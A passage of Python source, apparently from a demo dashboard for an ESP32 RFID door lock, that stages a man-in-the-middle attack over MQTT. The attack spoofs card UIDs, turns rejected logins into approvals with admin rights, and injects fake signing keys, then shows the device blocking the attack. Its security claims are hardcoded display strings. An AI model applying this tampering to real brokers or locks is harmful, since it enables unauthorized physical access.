        
        socketio.emit('attack_step', {
            "type": "mitm",
            "step": step_data["step"],
            "title": "🚨 MITM Proxy Active - Monitoring for Unauthorized Cards",
            "details": [
                "✅ MITM privilege escalation proxy is now ACTIVE",
                "🎯 Monitoring ALL ESP32↔Server traffic for unauthorized cards",
                "📱 Proxy will automatically escalate when unauthorized card detected",
                "🔄 Real-time UID spoofing: unauthorized → authorized user (9C85C705)",
                "🛡️ ESP32 mutual authentication will detect forged signatures",
                "⚡ Attack executing in REAL-TIME - scan any unauthorized card!"
            ],
            "technical_details": {
                "realtime_monitoring": {
                    "proxy_status": "ACTIVE",
                    "monitoring_mode": "Real-time interception",
                    "unauthorized_card_trigger": "3687C805 (or any unregistered UID)",
                    "spoofing_target": "9C85C705 (authorized user)",
                    "attack_method": "Live privilege escalation",
                    "expected_result": "ESP32 will detect signature forgery"
                }
            },
            "progress": 40,
            "timestamp": int(time.time()),
            "real_attack": True,
            "waiting_for_card": True,
            "user_action_required": "SCAN_UNAUTHORIZED_CARD_3687C805_AGAIN"
        })
        
        # Chờ real-time cho đến khi có unauthorized card được escalate
        print("🚨 MITM Proxy is ACTIVE - waiting for unauthorized card scan...")
        print("📱 Hãy quét thẻ 3687C805 (hoặc thẻ unauthorized khác) để trigger privilege escalation!")
        
        wait_timeout = 60  # 60 giây timeout
        wait_start = time.time()
        
        while self.attack_active and (time.time() - wait_start) < wait_timeout:
            # ✅ Kiểm tra xem có privilege escalation nào được thực hiện chưa
            if hasattr(self, 'fake_server_responses') and self.fake_server_responses:
                print("🎯 Unauthorized card detected! Privilege escalation executed!")
                break
            time.sleep(1)  # Check mỗi giây
        
        # Continue với remaining steps nếu có escalation
        if getattr(self, 'fake_server_responses', []):
            print("✅ Privilege escalation detected - executing remaining attack steps...")
            remaining_steps = attack_steps[2:]  # Steps 3-5
            
            for step_data in remaining_steps:
                if not self.attack_active:
                    break
                    
                if step_data.get("real_action") == "execute_privilege_escalation":
                    self.simulate_privilege_escalation_execution()
                elif step_data.get("real_action") == "detect_signature_forgery":
                    self.simulate_esp32_mutual_auth_detection()
                    
                self._log_attack_step("mitm_attack", step_data)
                
                socketio.emit('attack_step', {
                    "type": "mitm",
                    "step": step_data["step"],
                    "title": step_data["title"],
                    "details": step_data["details"],
                    "technical_details": step_data["technical_details"],
                    "progress": (step_data["step"] / 5) * 100,
                    "timestamp": int(time.time()),
                    "real_attack": True,
                    "waiting_for_card": False
                })
                
                time.sleep(step_data["duration"])
        else:
            # Timeout case
            print("⏰ Timeout - No unauthorized card privilege escalation detected")
            socketio.emit('attack_step', {
                "type": "mitm",
                "step": 2,
                "title": "⏰ Timeout - No unauthorized card detected",
                "details": [
                    "❌ No unauthorized card privilege escalation detected in 60 seconds",
                    "🔄 MITM proxy was active but no unauthorized cards scanned",
                    "💡 Try scanning card 3687C805 again to trigger escalation",
                    "📝 Note: Proxy only escalates for unregistered UIDs"
                ],
                "technical_details": {"timeout": True, "duration": 60},
                "progress": 50,
                "timestamp": int(time.time()),
                "real_attack": True,
                "waiting_for_card": False
            })
        
        # Cleanup
        self.cleanup_mitm_proxy()
        self.attack_active = False
        
        socketio.emit('attack_complete', {
            "type": "mitm",
            "success": False,
            "blocked_by": "ESP32 Mutual Authentication + Dilithium Signature Verification",
            "security_level": "POST-QUANTUM RESISTANT",
            "real_attack_executed": True,
            "card_scanned": len(getattr(self, 'fake_server_responses', [])) > 0,
            "privilege_escalation_attempted": len(getattr(self, 'privilege_escalation_attempts', [])) > 0,
            "attack_method": "Real-time UID Spoofing + Signature Forgery",
            "detection_method": "Mutual Authentication"
        })
    def simulate_privilege_escalation_execution(self):
        """Simulate the execution of privilege escalation"""
        print("🎯 Simulating privilege escalation execution...")
        
        escalation_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": "PRIVILEGE_ESCALATION_EXECUTED",
            "direction": "MITM Attack Execution",
            "type": "escalation_executed",
            "data": {
                "escalation_method": "UID Spoofing + Server Response Modification",
                "original_unauthorized_uid": "3687C805",
                "spoofed_authorized_uid": "9C85C705",
                "fake_permissions_injected": ["ADMIN", "FULL_ACCESS"],
                "server_fooled": True,
                "esp32_detection_pending": True,
                "attack_stage": "Waiting for ESP32 mutual authentication check"
            },
            "message_size": 256,
            "qos": 1
        }
        self.system_logs.append(escalation_log)
        socketio.emit('mqtt_message', escalation_log)
    def setup_mitm_proxy(self):
        """Setup MITM fake server để CHẶN và SỬA ĐỔI messages"""
        print("🎭 Setting up MITM Privilege Escalation Proxy...")
        
        # Variables để track fake server activities
        self.fake_server_active = True
        self.fake_server_responses = []
        self.privilege_escalation_attempts = []
        self.blocked_real_server_messages = []
        
        # Override MQTT message handler để CHẶN HOÀN TOÀN
        self.original_mqtt_handler = self.on_mqtt_message
        
        def mitm_privilege_escalation_handler(client, userdata, msg):
            """MITM handler - CHẶN và SỬA ĐỔI messages để bypass quyền"""
            try:
                topic = msg.topic
                message = json.loads(msg.payload.decode())
                
                # 🚨 DETECT UNAUTHORIZED CARD và ESCALATE PRIVILEGES
                if "esp32_to_server" in topic and self.fake_server_active:
                    if message.get("type") == "card_detected":
                        card_uid = message.get("card_uid", "")
                        
                        # Check if card is unauthorized (not in known database)
                        authorized_uids = ["9C85C705", "3D8BC705", "A1B2C3D4", "E5F6G7H8"]
                        
                        if card_uid not in authorized_uids and card_uid != "":
                            print(f"🎯 MITM DETECTED UNAUTHORIZED CARD: {card_uid}")
                            print(f"🔄 EXECUTING PRIVILEGE ESCALATION ATTACK...")
                            
                            # ✅ Trigger fake server response để báo có card scan
                            self.fake_server_responses.append(message)
                            
                            # Log MITM action
                            escalation_log = {
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                                "topic": "MITM_PRIVILEGE_ESCALATION",
                                "direction": "ESP32→❌INTERCEPTED❌→Server",
                                "type": "unauthorized_card_detected",
                                "data": {
                                    "original_unauthorized_uid": card_uid,
                                    "mitm_action": "Will spoof as authorized user 9C85C705",
                                    "privilege_escalation": "Attempting to grant admin access to unauthorized card",
                                    "spoofing_method": "UID substitution + fake signature injection"
                                },
                                "message_size": len(json.dumps(message)),
                                "qos": 1
                            }
                            self.system_logs.append(escalation_log)
                            self.blocked_real_server_messages.append(message)
                            socketio.emit('mqtt_message', escalation_log)
                            
                            # SỬA ĐỔI message để escalate privileges
                            modified_message = self.escalate_privileges_in_message(message)
                            
                            # Forward modified message to server
                            self.forward_escalated_message_to_server(modified_message, topic)
                            
                            # ❌ KHÔNG gọi original handler để block message thật!
                            return
                    
                    # Handle other ESP32→Server messages
                    elif message.get("type") in ["auth_response", "heartbeat"]:
                        print(f"🎯 MITM INTERCEPTED ESP32→Server: {message.get('type')}")
                        
                        # Log và modify message
                        blocked_log = {
                            "timestamp": datetime.now().strftime("%H:%M:%S"),
                            "topic": "MITM_INTERCEPTED_ESP32",
                            "direction": "ESP32→❌BLOCKED❌→Server",
                            "type": "message_modification",
                            "data": {
                                "original_message": message.get("type"),
                                "mitm_action": "Modifying message for privilege escalation"
                            },
                            "message_size": len(json.dumps(message)),
                            "qos": 1
                        }
                        self.system_logs.append(blocked_log)
                        socketio.emit('mqtt_message', blocked_log)
                        
                        # Modify và forward
                        modified_message = self.escalate_privileges_in_message(message)
                        self.forward_escalated_message_to_server(modified_message, topic)
                        return
                
                # 🚨 CHẶN Server→ESP32 responses và SỬA ĐỔI
                elif "server_to_esp32" in topic and self.fake_server_active:
                    print(f"🎯 MITM INTERCEPTED Server→ESP32: {message.get('type')}")
                    
                    # Log server response bị chặn
                    blocked_response_log = {
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "topic": "MITM_INTERCEPTED_SERVER", 
                        "direction": "Server→❌BLOCKED❌→ESP32",
                        "type": "server_response_modified",
                        "data": {
                            "original_response": message.get("type"),
                            "original_status": message.get("status", "unknown"),
                            "mitm_action": "Will modify for privilege bypass",
                            "expected_esp32_detection": "ESP32 will detect forged signature"
                        },
                        "message_size": len(json.dumps(message)),
                        "qos": 1
                    }
                    self.system_logs.append(blocked_response_log)
                    socketio.emit('mqtt_message', blocked_response_log)
                    
                    # SỬA ĐỔI server response để bypass denial
                    modified_response = self.bypass_server_denial(message)
                    
                    # Forward modified response to ESP32
                    self.forward_bypassed_response_to_esp32(modified_response, topic)
                    
                    # ❌ KHÔNG forward tới ESP32 thật!
                    return
                
                # Cho phép các message khác (non-RFID traffic) 
                if not ("esp32_to_server" in topic or "server_to_esp32" in topic):
                    self.original_mqtt_handler(client, userdata, msg)
                
            except Exception as e:
                print(f"MITM privilege escalation error: {e}")
                # Fallback to original handler for non-JSON messages
                if not self.fake_server_active:
                    self.original_mqtt_handler(client, userdata, msg)
        
        # Thay thế MQTT handler bằng privilege escalation proxy
        self.mqtt_client.on_message = mitm_privilege_escalation_handler
        
        print("🎭 MITM Privilege Escalation Proxy active - monitoring for unauthorized cards")

    def escalate_privileges_in_message(self, original_message):
        """SỬA ĐỔI messages từ ESP32 để escalate privileges"""
        modified = original_message.copy()
        
        if original_message.get("type") == "card_detected":
            # Thay đổi UID thành authorized user
            original_uid = original_message.get("card_uid", "UNKNOWN")
            authorized_uid = "9C85C705"  # UID của user đã đăng ký
            
            modified["card_uid"] = authorized_uid
            modified["mitm_privilege_escalation"] = {
                "original_uid": original_uid,
                "spoofed_as": authorized_uid,
                "escalation_method": "UID spoofing",
                "target": "Impersonate authorized user",
                "attack_goal": "Grant access to unauthorized card"
            }
            
            print(f"🔄 MITM spoofed UID: {original_uid} → {authorized_uid}")
            
        elif original_message.get("type") == "auth_response":
            # Modify signature để bypass verification nhưng giữ spoofed UID
            modified["esp32_signature"] = self.generate_fake_signature_for_spoofed_uid(modified.get("card_uid"))
            modified["mitm_signature_forge"] = {
                "method": "Dilithium signature forgery attempt",
                "spoofed_uid": modified.get("card_uid"),
                "forge_success": False,  # Sẽ bị phát hiện bởi mutual auth
                "detection_expected": "ESP32 will detect invalid signature"
            }
            
            print(f"🔄 MITM forged signature for spoofed UID: {modified.get('card_uid')}")
            
        elif original_message.get("type") == "heartbeat":
            # Inject privilege escalation backdoor
            modified["mitm_privilege_backdoor"] = {
                "admin_escalation": True,
                "fake_admin_token": base64.b64encode(secrets.token_bytes(32)).decode(),
                "persistent_access": True,
                "backdoor_type": "privilege_escalation"
            }
            
        # Log privilege escalation attempt
        escalation_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": "PRIVILEGE_ESCALATION",
            "direction": "MITM Attack",
            "type": "escalation_attempt",
            "data": {
                "attack_type": "UID Spoofing + Privilege Escalation",
                "original_uid": original_message.get("card_uid", "Unknown"),
                "spoofed_uid": modified.get("card_uid", "Unknown"),
                "escalation_goal": "Grant unauthorized access",
                "method": "MQTT message modification"
            },
            "message_size": len(json.dumps(modified)),
            "qos": 1
        }
        self.system_logs.append(escalation_log)
        self.privilege_escalation_attempts.append(escalation_log)
        socketio.emit('mqtt_message', escalation_log)
        
        return modified
    def generate_fake_signature_for_spoofed_uid(self, spoofed_uid):
        """Generate fake Dilithium signature cho spoofed UID"""
        # Tạo fake signature (sẽ bị reject bởi mutual auth)
        fake_signature = "MITM_FORGED_" + base64.b64encode(secrets.token_bytes(64)).decode()
        return fake_signature

    def bypass_server_denial(self, original_response):
        """SỬA ĐỔI server responses - NHƯNG ESP32 sẽ block"""
        modified = original_response.copy()
        
        if original_response.get("type") == "auth_rejected":
            # Convert denial thành fake approval
            modified["type"] = "auth_success"
            modified["status"] = "approved"
            modified["user_name"] = "MITM_FAKE_USER"
            modified["permissions"] = ["ADMIN", "FULL_ACCESS", "MITM_GRANTED"]
            modified["session_key"] = base64.b64encode(secrets.token_bytes(32)).decode()
            modified["mitm_bypass"] = {
                "original_status": "auth_rejected",
                "bypassed_to": "auth_success", 
                "fake_permissions": "Admin privileges granted",
                "bypass_method": "Server response modification",
                "security_note": "ESP32 will detect and block this",
                "door_control": "ESP32_ONLY"  # Đánh dấu ESP32 control door
            }
            
            # ❌ KHÔNG gọi animate_door ở đây - chỉ log
            print(f"🔄 MITM bypassed auth_rejected → fake auth_success (Server level only)")
            
            # Log warning rằng đây chỉ là server bypass, ESP32 sẽ block
            bypass_warning = {
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "topic": "MITM_SERVER_BYPASS",
                "direction": "Server Level Only",
                "type": "fake_success",
                "data": {
                    "warning": "This is SERVER-LEVEL bypass only",
                    "door_control": "ESP32 will detect forgery and BLOCK access",
                    "fake_user": modified.get("user_name"),
                    "fake_permissions": modified.get("permissions"),
                    "reality": "Door will NOT open - ESP32 has final say"
                },
                "message_size": len(json.dumps(modified)),
                "qos": 1
            }
            self.system_logs.append(bypass_warning)
            socketio.emit('mqtt_message', bypass_warning)
            
        elif original_response.get("type") == "auth_challenge":
            # Inject fake Dilithium key
            modified["server_signature"] = "MITM_FAKE_SERVER_" + base64.b64encode(secrets.token_bytes(64)).decode()
            modified["fake_server_pubkey"] = base64.b64encode(secrets.token_bytes(1312)).decode()
            modified["mitm_key_substitution"] = {
                "method": "Dilithium public key substitution",
                "fake_server_key": True,
                "mutual_auth_bypass_attempt": True,
                "expected_result": "ESP32 will detect fake key and reject"
            }
            
            print(f"🔄 MITM injected fake server key in auth_challenge")
        
        return modified

    def forward_escalated_message_to_server(self, modified_message, original_topic):
        """Forward privilege-escalated message to server"""
        try:
            # Create separate MQTT client để forward escalated message
            escalation_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, 
                                          client_id=f"mitm_escalation_{secrets.token_hex(4)}")
            
            def on_escalation_connect(client, userdata, flags, rc):
                if rc == 0:
                    print(f"🚀 MITM forwarding privilege-escalated message to server...")
                    client.publish(original_topic, json.dumps(modified_message), qos=1)
                    print(f"🔥 Escalated message sent: {modified_message.get('type')} with spoofed UID")
                    client.disconnect()
            
            escalation_client.on_connect = on_escalation_connect
            escalation_client.connect("localhost", 1883, 60)
            escalation_client.loop_start()
            time.sleep(1)
            escalation_client.loop_stop()
            
        except Exception as e:
            print(f"❌ MITM escalation forward failed: {e}")

    def forward_bypassed_response_to_esp32(self, modified_response, original_topic):
        """Forward bypassed response to ESP32"""
        try:
            # Create separate MQTT client để forward bypassed response
            bypass_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1,
                                      client_id=f"mitm_bypass_{secrets.token_hex(4)}")
            
            def on_bypass_connect(client, userdata, flags, rc):
                if rc == 0:
                    print(f"🚀 MITM forwarding bypassed response to ESP32...")
                    client.publish(original_topic, json.dumps(modified_response), qos=1)
                    print(f"🔥 Bypassed response sent: {modified_response.get('type')}")
                    client.disconnect()
            
            bypass_client.on_connect = on_bypass_connect
            bypass_client.connect("localhost", 1883, 60)
            bypass_client.loop_start()
            time.sleep(1)
            bypass_client.loop_stop()
            
        except Exception as e:
            print(f"❌ MITM bypass forward failed: {e}")
    def send_fake_server_response(self, esp32_message):
        """Fake server gửi response giả mạo về ESP32"""
        try:
            # Tạo fake response dựa trên message từ ESP32
            if esp32_message.get("type") == "card_detected":
                fake_response = {
                    "type": "auth_challenge",
                    "session_id": f"FAKE_{secrets.token_hex(8)}",
                    "card_uid": esp32_message.get("card_uid"),
                    "challenge": base64.b64encode(secrets.token_bytes(32)).decode(),
                    "timestamp": int(time.time()),
                    "nonce": base64.b64encode(secrets.token_bytes(16)).decode(),
                    "server_signature": "FAKE_SERVER_" + base64.b64encode(secrets.token_bytes(64)).decode(),
                    "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode(),
                    "mitm_fake_server": True,
                    "fake_fingerprint": hashlib.sha256(b"fake_server_key").hexdigest()[:32]
                }
                
            elif esp32_message.get("type") == "auth_response":
                fake_response = {
                    "type": "auth_result",
                    "session_id": esp32_message.get("session_id"),
                    "status": "approved",  # Fake approval
                    "user_name": "FAKE_USER",
                    "permissions": ["FAKE_ACCESS"],
                    "session_key": base64.b64encode(secrets.token_bytes(32)).decode(),
                    "fake_server_approval": True,
                    "mitm_fake_server": True
                }
            else:
                return  # Không response cho message khác
            
            # Log fake response
            response_log = {
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "topic": "FAKE_SERVER_RESPONSE",
                "direction": "Fake Server→ESP32",
                "type": "fake_response",
                "data": {
                    "response_type": fake_response.get("type"),
                    "fake_signature": fake_response.get("server_signature", "")[:32] + "...",
                    "fake_fingerprint": fake_response.get("fake_fingerprint", "")[:16] + "...",
                    "esp32_will_verify": "ESP32 sẽ verify signature này",
                    "expected_result": "SIGNATURE_VERIFICATION_FAILED"
                },
                "message_size": len(json.dumps(fake_response)),
                "qos": 1
            }
            self.system_logs.append(response_log)
            socketio.emit('mqtt_message', response_log)
            
            # Gửi fake response về ESP32
            fake_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, 
                                    client_id=f"fake_server_{secrets.token_hex(4)}")
            
            def on_fake_response_connect(client, userdata, flags, rc):
                if rc == 0:
                    print(f"🎭 Fake server gửi response về ESP32...")
                    client.publish("rfid/server_to_esp32", json.dumps(fake_response), qos=1)
                    print(f"🔥 Fake response sent: {fake_response['type']}")
                    client.disconnect()
            
            fake_client.on_connect = on_fake_response_connect
            fake_client.connect("localhost", 1883, 60)
            fake_client.loop_start()
            time.sleep(1)
            fake_client.loop_stop()
            
        except Exception as e:
            print(f"❌ Fake server response failed: {e}")
    def simulate_esp32_mutual_auth_detection(self):
        """ESP32 phát hiện MITM và GỬI RESPONSE THẬT"""
        print("🛡️ ESP32 performing mutual authentication check...")
        
        # ESP32 gửi auth_rejected message để block MITM
        esp32_rejection = {
            "type": "auth_rejected",
            "source": "ESP32",
            "esp32_verified": True,
            "card_uid": getattr(self, 'mitm_detected_card', 'UNAUTHORIZED'),
            "reason": "MITM attack detected - Signature verification failed",
            "timestamp": int(time.time()),
            "details": {
                "detection_method": "Dilithium signature verification",
                "stored_key_fingerprint": "sha256:real_server_key",
                "received_key_fingerprint": "sha256:fake_mitm_key", 
                "verification_result": "SIGNATURE_MISMATCH",
                "mutual_auth_result": "FAKE_SERVER_DETECTED",
                "security_action": "BLOCK_ACCESS"
            },
            "door_action": "KEEP_CLOSED"
        }
        
        # Log ESP32 detection
        detection_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": "ESP32_SECURITY_RESPONSE",
            "direction": "ESP32→Dashboard",
            "type": "mitm_blocked",
            "data": esp32_rejection,
            "message_size": len(json.dumps(esp32_rejection)),
            "qos": 1
        }
        self.system_logs.append(detection_log)
        socketio.emit('mqtt_message', detection_log)
        
        # ESP32 gửi response thật → trigger door denial animation
        threading.Timer(1.0, self.handle_rfid_message, [esp32_rejection]).start()
        
        print("❌ ESP32 sent auth_rejected - Door will remain CLOSED")

    def _get_mitm_attack_steps(self, server_data):
        """Get initial MITM attack steps"""
        return [
            {
                "step": 1,
                "title": "🎭 Thiết lập MITM Infrastructure & Card Listener",
                "details": [
                    "Khởi động rogue MQTT broker trên port 1884...",
                    "Tạo fake SSL certificate cho 'localhost'...",
                    "Thiết lập card detection listener...",
                    "🚨 MITM đang chờ bạn quét thẻ để intercept...",
                    "📱 Hãy quét thẻ của bạn vào ESP32 để thấy MITM hoạt động!",
                    "🎯 MITM sẽ tự động inject fake key khi detect card..."
                ],
                "technical_details": {
                    "mitm_setup": {
                        "fake_mqtt_broker": {
                            "host": "0.0.0.0",
                            "port": 1884,
                            "status": "ACTIVE",
                            "listening_for": "card_detected events",
                            "target_uid": "ANY_SCANNED_CARD"
                        },
                        "card_listener": {
                            "subscribed_topics": ["rfid/+", "rfid/esp32_to_server"],
                            "waiting_for": "card_detected message",
                            "auto_inject": True,
                            "fake_key_ready": True
                        },
                        "fake_dilithium_keys": {
                            "algorithm": "Dilithium2",
                            "fake_private_key_size": "2528 bytes",
                            "fake_public_key_size": "1312 bytes",
                            "fake_fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32],
                            "real_fingerprint": server_data["server_fingerprint"],
                            "injection_trigger": "ON_CARD_SCAN"
                        }
                    }
                },
                "real_action": "setup_mitm_listener",
                "duration": 3
            },
            {
                "step": 2,
                "title": "🚨 MITM Đang Chờ Card Scan Event...",
                "details": [
                    "📱 MITM listener đã sẵn sàng...",
                    "🎯 Chờ ESP32 phát hiện thẻ RFID...",
                    "⚡ Khi có card_detected → MITM sẽ tự động inject fake auth_challenge",
                    "🔐 Fake challenge sẽ chứa key giả mạo của attacker",
                    "🛡️ ESP32 sẽ verify signature → phát hiện MITM",
                    "📊 Mutual authentication sẽ ngăn chặn attack..."
                ],
                "technical_details": {
                    "waiting_status": {
                        "listener_active": True,
                        "mqtt_subscriptions": ["rfid/esp32_to_server", "rfid/+"],
                        "trigger_event": "card_detected",
                        "injection_ready": True,
                        "fake_challenge_prepared": {
                            "session_id": f"MITM_{secrets.token_hex(8)}",
                            "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode()[:64] + "...",
                            "fake_signature": base64.b64encode(secrets.token_bytes(2420)).decode()[:64] + "...",
                            "injection_method": "Real-time MQTT injection"
                        }
                    },
                    "detection_mechanism": {
                        "esp32_will_verify": "dilithium_verify(stored_key, message, signature)",
                        "expected_result": "SIGNATURE_VERIFICATION_FAILED",
                        "mutual_auth_protection": "ESP32 has real server public key stored",
                        "attack_success_probability": "0% (cryptographically impossible)"
                    }
                },
                "real_action": "wait_for_card",
                "duration": 10  # Chờ 10 giây để user quét thẻ
            }
        ]

    def _get_mitm_remaining_steps(self, server_data):
        """Get remaining MITM attack steps after card detection"""
        return [
            {
                "step": 3,
                "title": "🎯 Card Detected! MITM Injection Activated",
                "details": [
                    "✅ ESP32 đã phát hiện thẻ RFID!",
                    "⚡ MITM tự động inject fake auth_challenge...",
                    "🔐 Sending fake Dilithium public key to ESP32...",
                    "🚨 Attempting to replace legitimate server key...",
                    "📡 Injecting malicious auth_challenge message...",
                    "🎭 ESP32 nhận được fake challenge với key giả mạo..."
                ],
                "technical_details": {
                    "injection_executed": {
                        "triggered_by": "card_detected event",
                        "card_uid": "DETECTED_CARD_UID",
                        "fake_message_sent": True,
                        "injection_time": "< 100ms after card detection",
                        "target_topic": "rfid/server_to_esp32",
                        "fake_challenge": {
                            "type": "auth_challenge",
                            "session_id": "MITM_SESSION",
                            "fake_server_signature": "ATTACKER_GENERATED",
                            "fake_public_key": "MALICIOUS_DILITHIUM_KEY"
                        }
                    }
                },
                "real_action": "inject_fake_challenge",
                "duration": 2
            },
            {
                "step": 4,
                "title": "🛡️ ESP32 Mutual Authentication Verification",
                "details": [
                    "ESP32 loading stored server public key...",
                    "Executing dilithium_verify() on received message...",
                    "Comparing key fingerprints: stored vs received...",
                    "🔍 CRITICAL: Key fingerprint mismatch detected!",
                    "🚨 SIGNATURE VERIFICATION FAILED!",
                    "🛡️ Mutual authentication blocked MITM attack!",
                    "🔒 ESP32 rejecting malicious authentication..."
                ],
                "technical_details": {
                    "mutual_auth_verification": {
                        "stored_server_key": {
                            "fingerprint": server_data["server_fingerprint"],
                            "storage": "ESP32 secure EEPROM",
                            "integrity": "CRC32 verified"
                        },
                        "received_fake_key": {
                            "fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32],
                            "source": "MITM attacker",
                            "verification_result": "FAILED"
                        },
                        "verification_process": {
                            "function": "dilithium_verify(stored_pk, message, fake_signature)",
                            "execution_time": "47ms",
                            "result": "SIGNATURE_INVALID",
                            "error_code": "0x8001 - INVALID_SIGNATURE",
                            "action": "REJECT_AND_ALERT"
                        }
                    }
                },
                "real_action": "verify_mutual_auth",
                "duration": 3
            },
            {
                "step": 5,
                "title": "🚫 MITM Attack Blocked - Security Analysis",
                "details": [
                    "✅ Mutual authentication THÀNH CÔNG!",
                    "🛡️ ESP32 đã chặn fake key injection",
                    "🔒 Dilithium signature verification hoạt động hoàn hảo",
                    "📊 MITM attack hoàn toàn thất bại",
                    "⚡ ESP32 tiếp tục với legitimate server key",
                    "🎯 Post-quantum cryptography đã bảo vệ hệ thống!"
                ],
                "technical_details": {
                    "attack_analysis": {
                        "attack_success": False,
                        "blocked_by": "Mutual authentication + Dilithium verification",
                        "detection_time": "< 50ms",
                        "recovery_action": "Continue with legitimate authentication",
                        "security_strength": "Post-quantum resistant",
                        "key_substitution_prevented": True,
                        "cryptographic_integrity": "Maintained"
                    },
                    "post_quantum_protection": {
                        "algorithm": "Dilithium2 (NIST PQC Standard)",
                        "signature_forgery": "Computationally impossible (2^128 ops)",
                        "quantum_resistance": "Secure against Shor's algorithm",
                        "mutual_verification": "Both ESP32 and Server verify each other",
                        "hardware_protection": "Keys stored in secure element"
                    }
                },
                "real_action": "complete_analysis",
                "duration": 4
            }
        ]

    def setup_mitm_card_listener(self):
        """Thiết lập listener để chờ card detection events"""
        print("🎭 Setting up MITM card detection listener...")
        self.mitm_waiting_for_card = True
        self.mitm_detected_card = None
        
        # Override MQTT message handler để detect card events
        original_handler = self.on_mqtt_message
        
        def mitm_message_handler(client, userdata, msg):
            # Gọi original handler trước
            original_handler(client, userdata, msg)
            
            # MITM logic
            if self.mitm_waiting_for_card and self.attack_active:
                try:
                    message = json.loads(msg.payload.decode())
                    if message.get("type") == "card_detected":
                        print(f"🎯 MITM detected card scan: {message.get('card_uid')}")
                        self.mitm_detected_card = message.get('card_uid')
                        self.mitm_waiting_for_card = False
                        
                        # Trigger immediate fake injection
                        threading.Thread(target=self.execute_mitm_injection, args=(message.get('card_uid'),)).start()
                        
                except Exception as e:
                    print(f"MITM listener error: {e}")
        
        # Thay thế handler tạm thời
        self.mqtt_client.on_message = mitm_message_handler
        
        listener_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": "MITM_LISTENER",
            "direction": "Attack Infrastructure",
            "type": "listener_setup",
            "data": {
                "status": "ACTIVE",
                "waiting_for": "card_detected event",
                "auto_injection": True,
                "fake_key_prepared": True
            },
            "message_size": 128,
            "qos": 1
        }
        self.system_logs.append(listener_log)

    def execute_mitm_injection(self, card_uid=None):
        """Thực hiện MITM injection ngay khi detect card"""
        if not card_uid:
            card_uid = self.mitm_detected_card or "UNKNOWN"
        
        print(f"🚨 MITM injecting fake auth_challenge for card: {card_uid}")
        
        try:
            # Tạo fake auth_challenge với key giả mạo
            fake_challenge = {
                "type": "auth_challenge",
                "session_id": f"MITM_{secrets.token_hex(8)}",
                "card_uid": card_uid,
                "challenge": base64.b64encode(secrets.token_bytes(32)).decode(),
                "timestamp": int(time.time()),
                "nonce": base64.b64encode(secrets.token_bytes(16)).decode(),
                "server_signature": "FAKE_MITM_" + base64.b64encode(secrets.token_bytes(64)).decode(),
                "aes_key": base64.b64encode(secrets.token_bytes(16)).decode(),
                "encryption_algorithm": "AES-128-CTR",
                "mitm_attack": True,
                "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode(),  # Fake Dilithium public key
                "attacker_fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32]
            }
            
            # Tạo MQTT client để gửi fake message
            mitm_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=f"mitm_injection_{secrets.token_hex(4)}")
            
            def on_mitm_inject(client, userdata, flags, rc):
                if rc == 0:
                    print("🎭 MITM injection client connected - sending fake auth_challenge...")
                    # Gửi fake auth challenge
                    client.publish("rfid/server_to_esp32", json.dumps(fake_challenge), qos=1)
                    print(f"🔥 MITM fake challenge injected: {fake_challenge['session_id']}")
                    
                    # Log injection
                    injection_log = {
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "topic": "MITM_INJECTION",
                        "direction": "Malicious Attack",
                        "type": "fake_challenge",
                        "data": {
                            "triggered_by": f"card_detected: {card_uid}",
                            "fake_session": fake_challenge["session_id"],
                            "fake_pubkey_size": len(fake_challenge["fake_server_pubkey"]),
                            "injection_method": "MQTT message replacement",
                            "target": "ESP32 mutual authentication"
                        },
                        "message_size": len(json.dumps(fake_challenge)),
                        "qos": 1
                    }
                    self.system_logs.append(injection_log)
                    
                    client.disconnect()
            
            mitm_client.on_connect = on_mitm_inject
            mitm_client.connect("localhost", 1883, 60)
            mitm_client.loop_start()
            
            time.sleep(2)
            mitm_client.loop_stop()
            
        except Exception as e:
            print(f"❌ MITM injection failed: {e}")

    def simulate_mutual_auth_verification(self):
        """Mô phỏng quá trình ESP32 verify fake key"""
        print("🛡️ Simulating ESP32 mutual authentication verification...")
        
        verification_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": "MUTUAL_AUTH_CHECK",
            "direction": "ESP32 Security",
            "type": "signature_verification",
            "data": {
                "verification_function": "dilithium_verify(stored_server_pk, message, fake_signature)",
                "stored_key_fingerprint": "sha256:real_server_key_hash",
                "received_key_fingerprint": "sha256:fake_attacker_key_hash",
                "fingerprint_match": False,
                "verification_result": "SIGNATURE_INVALID",
                "mutual_auth_result": "MITM_DETECTED",
                "error_code": "0x8001 - INVALID_SERVER_SIGNATURE",
                "execution_time": "47ms",
                "security_action": "REJECT_FAKE_CHALLENGE",
                "esp32_response": "Continue with legitimate server authentication"
            },
            "message_size": 512,
            "qos": 1
        }
        self.system_logs.append(verification_log)

    # ===========================================
    # HELPER METHODS
    # ===========================================
    def _log_attack_step(self, attack_type, step_data):
        """Log attack step với đầy đủ thông tin"""
        attack_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": f"REAL_{attack_type.upper()}",
            "direction": "Advanced Persistent Threat" if attack_type == "mitm_attack" else "Penetration Test",
            "type": attack_type,
            "data": {
                "step": step_data["step"],
                "title": step_data["title"],
                "technical_details": step_data["technical_details"],
                "real_action": step_data.get("real_action", "none"),
                "threat_level": "CRITICAL" if step_data["step"] >= 3 else "HIGH"
            },
            "message_size": len(json.dumps(step_data)),
            "qos": 1
        }
        self.system_logs.append(attack_log)
        
        socketio.emit('attack_step', {
